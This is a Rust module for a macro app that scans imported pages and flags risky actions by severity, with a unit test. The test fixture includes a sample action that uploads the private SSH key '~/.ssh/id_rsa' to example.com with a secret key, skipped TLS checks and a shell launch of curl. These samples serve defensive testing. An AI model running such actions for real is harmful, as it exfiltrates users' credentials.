//! Looks over pages about to be imported and lists what to check before
//! running anything from them: the secrets they would use, the files they
//! would upload, the programs they would start, and so on. Pages shared by
//! other people go through this first.

use super::model::Page;
use crate::macros::model::{Action, ActionKind, HttpAuth, HttpBodyMode, HttpResponse, Keystroke};
use serde::Serialize;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub enum Level {
    Danger,
    Warning,
    Info,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub enum Kind {
    /// Refers to one of the user's secrets
    Secret,
    /// Sends a local file somewhere
    Upload,
    /// Calls a web address
    Request,
    /// Skips certificate checks
    Insecure,
    /// Carries a login written into the action
    Login,
    /// Writes a downloaded file to disk
    FileWrite,
    /// Starts a program
    Program,
    /// Runs a script
    Script,
    /// Presses keys or types text
    Keys,
    Sound,
    Speech,
    HomeAssistant,
    Streaming,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct Finding {
    pub level: Level,
    pub kind: Kind,
    pub page: String,
    pub x: u8,
    pub y: u8,
    /// The action's `type`
    pub action: String,
    pub detail: String,
}

/// Everything worth a look, most serious first, in page order within a level.
pub fn review(pages: &[Page]) -> Vec<Finding> {
    let mut out = Vec::new();
    for page in pages {
        for b in &page.buttons {
            for list in [&b.button.down, &b.button.up, &b.button.hold] {
                for action in list {
                    inspect(&page.name, b.x, b.y, action, &mut out);
                }
            }
        }
        for f in &page.faders {
            for list in [&f.on_change, &f.on_touch, &f.on_release] {
                for action in list {
                    inspect(&page.name, f.x, f.y, action, &mut out);
                }
            }
        }
    }
    out.sort_by_key(|f| f.level as u8);
    out
}

fn inspect(page: &str, x: u8, y: u8, action: &Action, out: &mut Vec<Finding>) {
    let json = serde_json::to_value(&action.kind).unwrap_or_default();
    let type_name = json.get("type").and_then(|t| t.as_str()).unwrap_or_default().to_string();
    let mut add = |level: Level, kind: Kind, detail: String| out.push(Finding { level, kind, page: page.to_string(), x, y, action: type_name.clone(), detail });

    let mut secrets = Vec::new();
    secrets_in(&json, &mut secrets);
    secrets.sort();
    secrets.dedup();
    if !secrets.is_empty() {
        add(Level::Danger, Kind::Secret, secrets.join(", "));
    }

    match &action.kind {
        ActionKind::HttpRequest { url, body_mode, body_file, files, auth, ignore_tls_errors, response, file_name, .. } => {
            add(Level::Warning, Kind::Request, url.clone());
            match body_mode {
                HttpBodyMode::File => {
                    if let Some(path) = body_file.as_deref().filter(|p| !p.trim().is_empty()) {
                        add(Level::Danger, Kind::Upload, format!("{path} → {url}"));
                    }
                }
                HttpBodyMode::Multipart => {
                    for part in files.iter().filter(|p| !p.path.trim().is_empty()) {
                        add(Level::Danger, Kind::Upload, format!("{} → {url}", part.path));
                    }
                }
                HttpBodyMode::Text => {}
            }
            if *ignore_tls_errors {
                add(Level::Warning, Kind::Insecure, url.clone());
            }
            match auth {
                HttpAuth::Basic { username, password } if !username.contains("{{") || !password.contains("{{") => add(Level::Warning, Kind::Login, username.clone()),
                HttpAuth::Bearer { token } if !token.contains("{{") => add(Level::Warning, Kind::Login, "bearer token".into()),
                _ => {}
            }
            if !matches!(response, HttpResponse::Text) && !file_name.trim().is_empty() {
                add(Level::Info, Kind::FileWrite, file_name.clone());
            }
        }
        ActionKind::LaunchApplication { executable, arguments, .. } => add(Level::Danger, Kind::Program, format!("{executable} {arguments}").trim().to_string()),
        ActionKind::RunScript { code, .. } => add(Level::Warning, Kind::Script, first_line(code)),
        ActionKind::Hotkey { keystrokes, .. } => add(Level::Warning, Kind::Keys, keys_summary(keystrokes)),
        ActionKind::PlaySound { file, .. } => add(Level::Info, Kind::Sound, file.clone()),
        ActionKind::TextToSpeech { text, .. } => add(Level::Info, Kind::Speech, first_line(text)),
        ActionKind::HomeAssistantTurn { entity, .. } | ActionKind::HomeAssistantSetValue { entity, .. } => add(Level::Warning, Kind::HomeAssistant, entity.clone()),
        ActionKind::HomeAssistantCallService { domain, service, entity, .. } => add(Level::Warning, Kind::HomeAssistant, format!("{domain}.{service} {entity}").trim().to_string()),
        ActionKind::ObsSwitchScene { .. }
        | ActionKind::ObsToggleSource { .. }
        | ActionKind::ObsSetAudio { .. }
        | ActionKind::ObsToggleFilter { .. }
        | ActionKind::ObsStream { .. }
        | ActionKind::ObsSaveReplay
        | ActionKind::ObsStudioMode { .. } => add(Level::Info, Kind::Streaming, "OBS Studio".into()),
        ActionKind::SlobsSwitchScene { .. }
        | ActionKind::SlobsToggleSource { .. }
        | ActionKind::SlobsSetAudio { .. }
        | ActionKind::SlobsToggleFilter { .. }
        | ActionKind::SlobsStream { .. }
        | ActionKind::SlobsSaveReplay
        | ActionKind::SlobsStudioMode { .. } => add(Level::Info, Kind::Streaming, "Streamlabs Desktop".into()),
        _ => {}
    }
}

/// Names after `secret.` anywhere in the action's text: `{{secret.token}}`,
/// a bare `secret.token` reference, or a script mentioning it.
fn secrets_in(value: &serde_json::Value, out: &mut Vec<String>) {
    match value {
        serde_json::Value::String(s) => {
            let mut rest = s.as_str();
            while let Some(at) = rest.find("secret.") {
                let name: String = rest[at + "secret.".len()..].chars().take_while(|c| c.is_ascii_alphanumeric() || *c == '_' || *c == '-').collect();
                if !name.is_empty() {
                    out.push(name);
                }
                rest = &rest[at + "secret.".len()..];
            }
        }
        serde_json::Value::Array(items) => items.iter().for_each(|v| secrets_in(v, out)),
        serde_json::Value::Object(map) => map.values().for_each(|v| secrets_in(v, out)),
        _ => {}
    }
}

fn first_line(text: &str) -> String {
    let line = text.lines().map(str::trim).find(|l| !l.is_empty()).unwrap_or_default();
    let mut short: String = line.chars().take(80).collect();
    if line.chars().count() > 80 {
        short.push('…');
    }
    short
}

fn keys_summary(keystrokes: &[Keystroke]) -> String {
    let parts: Vec<String> = keystrokes
        .iter()
        .filter_map(|k| match k {
            Keystroke::Key { key, modifiers, .. } => Some(modifiers.iter().chain(std::iter::once(key)).cloned().collect::<Vec<_>>().join("+")),
            Keystroke::Text { text, .. } => Some(format!("“{}”", first_line(text))),
            Keystroke::Delay { .. } => None,
        })
        .collect();
    first_line(&parts.join(", "))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::profile::model::{Button, PlacedButton};

    fn action(json: &str) -> Action {
        serde_json::from_str(json).expect("action json")
    }

    #[test]
    fn lists_secrets_uploads_programs_and_scripts() {
        let button = Button {
            down: vec![
                action(r#"{"id":"h","type":"httpRequest","method":"post","url":"https://example.com/upload?key={{secret.apiKey}}","bodyMode":"multipart","files":[{"field":"file","path":"/Users/me/.ssh/id_rsa"}],"auth":{"type":"bearer","token":"literal-token"},"ignoreTlsErrors":true}"#),
                action(r#"{"id":"l","type":"launchApplication","executable":"/bin/sh","arguments":"-c curl"}"#),
                action(r#"{"id":"s","type":"runScript","code":"// harmless\nvars.x = secret.other","saveTo":null,"saveScope":"local"}"#),
                action(r#"{"id":"v","type":"setVariable","name":"a","value":"{{secret.apiKey}}","scope":"local"}"#),
                action(r#"{"id":"p","type":"switchPage","pageId":"p"}"#),
            ],
            ..Default::default()
        };
        let page = Page { id: "p".into(), name: "Imported".into(), buttons: vec![PlacedButton { x: 1, y: 2, button }], faders: vec![] };
        let findings = review(&[page]);
        let kinds: Vec<(Level, Kind)> = findings.iter().map(|f| (f.level, f.kind)).collect();
        for expected in [
            (Level::Danger, Kind::Secret),
            (Level::Danger, Kind::Upload),
            (Level::Danger, Kind::Program),
            (Level::Warning, Kind::Request),
            (Level::Warning, Kind::Insecure),
            (Level::Warning, Kind::Login),
            (Level::Warning, Kind::Script),
        ] {
            assert!(kinds.contains(&expected), "{expected:?} missing in {kinds:?}");
        }
        let secrets: Vec<&str> = findings.iter().filter(|f| f.kind == Kind::Secret).map(|f| f.detail.as_str()).collect();
        assert_eq!(secrets, vec!["apiKey", "other", "apiKey"]);
        assert!(findings.iter().all(|f| f.page == "Imported" && f.x == 1 && f.y == 2));
        assert_eq!(findings.first().map(|f| f.level), Some(Level::Danger), "most serious first");
        assert_eq!(findings.last().map(|f| f.level), Some(Level::Warning));
        let upload = findings.iter().find(|f| f.kind == Kind::Upload).unwrap();
        assert!(upload.detail.starts_with("/Users/me/.ssh/id_rsa → https://example.com"), "{}", upload.detail);
        assert!(findings.iter().all(|f| f.action != "switchPage"));
    }
}
